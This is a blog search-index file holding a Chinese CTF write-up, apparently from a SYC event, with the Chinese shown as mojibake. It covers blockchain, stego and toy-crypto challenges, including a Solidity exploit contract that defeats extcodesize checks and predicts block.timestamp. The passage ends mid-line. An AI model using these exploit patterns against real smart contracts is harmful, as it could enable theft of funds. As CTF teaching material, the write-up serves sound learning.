<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/11/27/give_me_Goerlieth/"/>
      <url>/2023/11/27/give_me_Goerlieth/</url>
      
        <content type="html"><![CDATA[<h3 id="give-me-Goerlieth"><a href="#give-me-Goerlieth" class="headerlink" title="give_me_Goerlieth"></a>give_me_Goerlieth</h3><p>è¿™ä¸ªé¢˜ç›®å—è¦æ±‚åœ¨Goerliethæµ‹è¯•è¿ä¸Šè¿›è¡Œï¼Œä½†æˆ‘æ²¡æœ‰Goerliethå¸å•Šï¼Œå’‹åŠï¼Œæ€ä¹ˆåš</p><p>è€ƒè™‘åˆ°é¢˜ç›®ä¸Šè®©äº¤Transaction Hashåœ¨åŒºå—è¿æµè§ˆå™¨ä¸Šæ˜¯å…¬å¼€çš„ï¼Œåªéœ€è¦åœ¨åŒºå—é“¾æµè§ˆå™¨ä¸Šäº¤åˆ«äººçš„å°±å¯ä»¥äº†</p><h3 id="SimpleConnect"><a href="#SimpleConnect" class="headerlink" title="SimpleConnect"></a>SimpleConnect</h3><p>å»åŒºå—é“¾æµè§ˆå™¨æœåœ°å€</p><h3 id="DEATH-N2TE"><a href="#DEATH-N2TE" class="headerlink" title="DEATH-N2TE"></a>DEATH-N2TE</h3><p>æå–è§†é¢‘ä¸­å¯ç–‘çš„åƒç´ ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def extract_pixels(video_path, threshold, start_col, col_interval, output_image_path):</span><br><span class="line">    cap = cv2.VideoCapture(video_path)</span><br><span class="line"></span><br><span class="line">    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))</span><br><span class="line">    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))</span><br><span class="line">    frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))</span><br><span class="line"></span><br><span class="line">    extracted_image = np.zeros((frame_height, min(frame_count, frame_width), 3), dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">    current_col = start_col</span><br><span class="line">    for frame_idx in range(frame_count):</span><br><span class="line">        ret, frame = cap.read()</span><br><span class="line">        if not ret:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if current_col &lt; frame_width:</span><br><span class="line">            col_to_scan = frame[:, current_col, :]</span><br><span class="line">            white_pixels = np.all(col_to_scan &gt;= threshold, axis=-1)</span><br><span class="line">            extracted_image[white_pixels, frame_idx, :] = col_to_scan[white_pixels]</span><br><span class="line"></span><br><span class="line">        current_col += col_interval</span><br><span class="line">        if current_col &gt;= frame_width:</span><br><span class="line">            current_col = start_col  # Reset to start if we exceed the width</span><br><span class="line"></span><br><span class="line">    cap.release()</span><br><span class="line"></span><br><span class="line">    cv2.imwrite(output_image_path, extracted_image)</span><br><span class="line">    cv2.imshow(&#x27;Extracted Image&#x27;, extracted_image)</span><br><span class="line">    cv2.waitKey(0)</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">video_path = &#x27;./kira.mp4&#x27;</span><br><span class="line">threshold = np.array([200, 200, 200])</span><br><span class="line">start_col = 5</span><br><span class="line">col_interval = 10</span><br><span class="line">output_image_path = &#x27;extracted_image.png&#x27;</span><br><span class="line"></span><br><span class="line">extract_pixels(video_path, threshold, start_col, col_interval, output_image_path)</span><br></pre></td></tr></table></figure><p>æå–å‡ºæ¥æœ‰äº›ä¸æ¸…æ¥šï¼Œå¯ä»¥æ”¾åˆ°æ–‡æ¡£é‡Œæ‹‰ä¼¸ä¸€ä¸‹ï¼Œå¾—åˆ°flag</p><p><img src="/2023/11/27/give_me_Goerlieth/AAwangzhan\1\hexoblog\source\image\image-20231127173648620.png" alt="image-20231127173648620"></p><h3 id="stage"><a href="#stage" class="headerlink" title="stage"></a>stage</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function getNumber() external view returns(uint256);</span><br><span class="line">&#125;</span><br><span class="line">contract stageGame&#123;</span><br><span class="line">    mapping (address =&gt; bool) private flag;</span><br><span class="line">    mapping (address =&gt; bool) public isStage1Completed;</span><br><span class="line"></span><br><span class="line">    function stage1() external &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        address addr = msg.sender;</span><br><span class="line">        assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">        require(size == 0,&quot;EOA must!&quot;);</span><br><span class="line">        isStage1Completed[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stage2(uint _guess) external &#123;</span><br><span class="line">        require(isStage1Completed[msg.sender],&quot;You should complete stage1 first!&quot;);</span><br><span class="line">        uint number = block.timestamp % 100 + 1;</span><br><span class="line">        require(number == _guess, &quot;Wrong number!&quot;);</span><br><span class="line">        _stage3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _stage3() private &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        address addr = msg.sender;</span><br><span class="line">        assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">        require(size &gt; 0,&quot;Contract must!&quot;);</span><br><span class="line">        uint256 number1;</span><br><span class="line">        uint256 number2;</span><br><span class="line">        (bool success,bytes memory data1) = addr.staticcall(abi.encodeWithSignature(&quot;getNumber()&quot;));</span><br><span class="line">        require(success,&quot;First call failed!&quot;);</span><br><span class="line">        number1 = abi.decode(data1, (uint256));</span><br><span class="line"></span><br><span class="line">        (bool success2,bytes memory data2) = addr.call(abi.encodeWithSignature(&quot;getNumber()&quot;));</span><br><span class="line">        require(success2,&quot;Second call failed!&quot;);</span><br><span class="line">        number2 = abi.decode(data2, (uint256));</span><br><span class="line">        require(number1 != number2, &quot;Must return different Number!&quot;);</span><br><span class="line"></span><br><span class="line">        flag[tx.origin] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function check(address addr) external view returns(bool)&#123;</span><br><span class="line">        return flag[addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆçº¦ä¸­æ€»å…±æœ‰3å…³</p><p>ç¬¬ä¸€å…³ï¼Œsizeä¸º0å³å¯ç»•è¿‡</p><p>ç¬¬äºŒå…³ï¼ŒçŒœæ•°ï¼Œç›´æ¥å¥—ä»–æºç å°±è¡Œ</p><p>uint number &#x3D; block.timestamp % 100 + 1;</p><p>ç¬¬ä¸‰å…³çš„è¯ï¼Œä»–éœ€è¦æ£€æŸ¥åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function getNumber() external view returns(uint256);</span><br><span class="line">&#125;</span><br><span class="line">contract stageGame&#123;</span><br><span class="line">    mapping (address =&gt; bool) private flag;</span><br><span class="line">    mapping (address =&gt; bool) public isStage1Completed;</span><br><span class="line"></span><br><span class="line">    function stage1() external &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        address addr = msg.sender;</span><br><span class="line">        assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">        require(size == 0,&quot;EOA must!&quot;);</span><br><span class="line">        isStage1Completed[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stage2(uint _guess) external &#123;</span><br><span class="line">        require(isStage1Completed[msg.sender],&quot;You should complete stage1 first!&quot;);</span><br><span class="line">        uint number = block.timestamp % 100 + 1;</span><br><span class="line">        require(number == _guess, &quot;Wrong number!&quot;);</span><br><span class="line">        _stage3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _stage3() private &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        address addr = msg.sender;</span><br><span class="line">        assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">        require(size &gt; 0,&quot;Contract must!&quot;);</span><br><span class="line">        uint256 number1;</span><br><span class="line">        uint256 number2;</span><br><span class="line">        (bool success,bytes memory data1) = addr.staticcall(abi.encodeWithSignature(&quot;getNumber()&quot;));</span><br><span class="line">        require(success,&quot;First call failed!&quot;);</span><br><span class="line">        number1 = abi.decode(data1, (uint256));</span><br><span class="line"></span><br><span class="line">        (bool success2,bytes memory data2) = addr.call(abi.encodeWithSignature(&quot;getNumber()&quot;));</span><br><span class="line">        require(success2,&quot;Second call failed!&quot;);</span><br><span class="line">        number2 = abi.decode(data2, (uint256));</span><br><span class="line">        require(number1 != number2, &quot;Must return different Number!&quot;);</span><br><span class="line"></span><br><span class="line">        flag[tx.origin] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function check(address addr) external view returns(bool)&#123;</span><br><span class="line">        return flag[addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// å‡è®¾stageGameåˆçº¦çš„æ¥å£å¦‚ä¸‹</span><br><span class="line">interface IStageGame &#123;</span><br><span class="line">    function stage1() external;</span><br><span class="line">    function stage2(uint256 number) external;</span><br><span class="line">    function check(address addr) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    IStageGame public stageGame;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        stageGame = IStageGame(_address);</span><br><span class="line">        stageGame.stage1();      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // å°è¯•è·å–gasæ¶ˆè€—é‡ï¼Œå¦‚æœæ¶ˆè€—è¶…è¿‡2000åˆ™è¿”å›0ï¼Œå¦åˆ™è¿”å›1</span><br><span class="line">    function getNumber() external view returns (uint256) &#123;</span><br><span class="line">        uint256 gbef = 0;</span><br><span class="line">        uint256 gaft = 0;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            gbef := gas()</span><br><span class="line">            let x := sload(0x66666)</span><br><span class="line">            gaft := gas()</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 gasc = gbef - gaft;</span><br><span class="line">        if (gasc &gt; 2000) &#123;</span><br><span class="line">            return uint256(0);</span><br><span class="line">        &#125;</span><br><span class="line">        return uint256(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // å°è¯•æ‰§è¡Œhackæ“ä½œï¼ŒæˆåŠŸåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›false</span><br><span class="line">    function hack(address addr) public returns (bool) &#123;</span><br><span class="line">        bool flag = false;</span><br><span class="line">        uint256 number = block.timestamp % 100 + 1;</span><br><span class="line">        stageGame.stage2(number);</span><br><span class="line">        flag = stageGame.check(addr);</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/11/27/give_me_Goerlieth/AAwangzhan\1\hexoblog\source\image\image-20231127184237308.png" alt="image-20231127184237308">ã€</p><p>ä¹‹åå°±æ‰“é€šäº†ï¼Œå¯ä»¥åœ¨è´¦æˆ·è¯¦æƒ…æŸ¥çœ‹ç§é’¥</p><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><blockquote><p>5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7dâ€¦ Hmmâ€¦ Something goes wrong with my grettings bot.</p></blockquote><p>ä¹‰çœ¼ç›¯çœŸã€‚16è¿›åˆ¶asciiè½¬åŒ–å¾—åˆ°flag</p><h3 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof_of_work"></a>proof_of_work</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import re</span><br><span class="line">import string</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def pass_POW():</span><br><span class="line">    rec = &#x27;sha256(XXXX+FCxk8M9svYwVMfGe) == 793edc396da13a7992b429e50e7d122c41debbd902419d26a0792b4008dba844&#x27;</span><br><span class="line">    table = string.ascii_letters + string.digits</span><br><span class="line">    suffix = re.findall(r&#x27;\(XXXX\+(.*?)\)&#x27;, rec)[0]</span><br><span class="line">    last_hash = re.findall(r&#x27;== (.*?)$&#x27;, rec)[0]</span><br><span class="line">    print(&quot;suffix: %s, last_hash: %s&quot; % (suffix, last_hash))</span><br><span class="line">    for i in product(table, repeat=4):</span><br><span class="line">        prefix = &#x27;&#x27;.join(i)</span><br><span class="line">        guess = prefix + suffix</span><br><span class="line">        if hashlib.sha256(guess.encode()).hexdigest() == last_hash:</span><br><span class="line">            print(&quot;prefix XXXX is %s&quot; % prefix)</span><br><span class="line">            return prefix</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">pass_POW()</span><br></pre></td></tr></table></figure><h3 id="SimpleRSA"><a href="#SimpleRSA" class="headerlink" title="SimpleRSA"></a>SimpleRSA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import * </span><br><span class="line">flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span><br><span class="line">assert len(flag) == 35</span><br><span class="line">p,q = [getPrime(2048) for _ in &quot;__&quot;] </span><br><span class="line">n = p*q </span><br><span class="line">e = 65537 </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line">print(p) </span><br><span class="line">print(c)</span><br><span class="line">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span><br><span class="line">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span><br></pre></td></tr></table></figure><h3 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import xor </span><br><span class="line">from os import urandom </span><br><span class="line">flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot; </span><br><span class="line"></span><br><span class="line"># step0: key generation &amp; distribution</span><br><span class="line">def s0(msg): </span><br><span class="line">    k1,k2 = [urandom(len(msg)) for _ in &quot;__&quot;] </span><br><span class="line">    return k1,k2 </span><br><span class="line"></span><br><span class="line">#  </span><br><span class="line"></span><br><span class="line"># step1: Alice encrypt M, and send it to Bob</span><br><span class="line">def s1(msg,k1):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    return c1 </span><br><span class="line"></span><br><span class="line"># step2: Bob encrypt c1, and send it to Alice </span><br><span class="line">def s2(msg,k2):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    return c2 </span><br><span class="line"></span><br><span class="line"># step3: Alice decrypt c2, and send it to Bob.</span><br><span class="line">def s3(msg,k1):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    return c3 </span><br><span class="line"></span><br><span class="line"># step4: Bob decrypt c3, get M.</span><br><span class="line">def s4(msg,k2):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    return m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(msg,k1,k2): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    assert msg == m_</span><br><span class="line"></span><br><span class="line"># Here&#x27;s what hacker Eve got:</span><br><span class="line">def encrypt_(msg,k1,k2):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    if HACK == True:</span><br><span class="line">        print(c1) </span><br><span class="line">        print(c2) </span><br><span class="line">        print(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span><br><span class="line">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span><br><span class="line">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rom pwn import xor </span><br><span class="line"></span><br><span class="line">C1=b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span><br><span class="line">C2=b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span><br><span class="line">C3=b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">K1=xor(C2,C3)</span><br><span class="line">K2=xor(C2,C1)</span><br><span class="line"></span><br><span class="line">flag=xor(K1,C1)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import * </span><br><span class="line">import os </span><br><span class="line">flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span><br><span class="line"></span><br><span class="line">pad = lambda msg,padlen: msg+os.urandom(padlen-len(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = pad(flag,32)</span><br><span class="line">print(len(flag))</span><br><span class="line">p = [getPrime(16) for _ in range(32)] </span><br><span class="line">c = [bytes_to_long(flag)%i for i in p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&#x27;p=&#x27;,p)</span><br><span class="line">print(&#x27;c=&#x27;,c)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span><br><span class="line">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">def chinese_remainder_theorem(c, p):</span><br><span class="line">    # è®¡ç®—æ¨¡æ•°çš„ä¹˜ç§¯</span><br><span class="line">    N = 1</span><br><span class="line">    for i in p:</span><br><span class="line">        N *= i</span><br><span class="line"></span><br><span class="line">    result = 0</span><br><span class="line">    for i in range(len(c)):</span><br><span class="line">        # è®¡ç®—æ¯ä¸ªæ¨¡æ•°çš„ä¹˜ç§¯</span><br><span class="line">        Ni = N // p[i]</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—æ¨¡åå…ƒç´ </span><br><span class="line">        Mi = pow(Ni, -1, p[i])</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—éƒ¨åˆ†è§£å¯†ç»“æœ</span><br><span class="line">        result += c[i] * Ni * Mi</span><br><span class="line"></span><br><span class="line">    # å–æœ€å°æ­£æ•´æ•°è§£</span><br><span class="line">    flag = result % N</span><br><span class="line"></span><br><span class="line">    return long_to_bytes(flag)</span><br><span class="line"></span><br><span class="line">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span><br><span class="line">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = chinese_remainder_theorem(c, p)</span><br><span 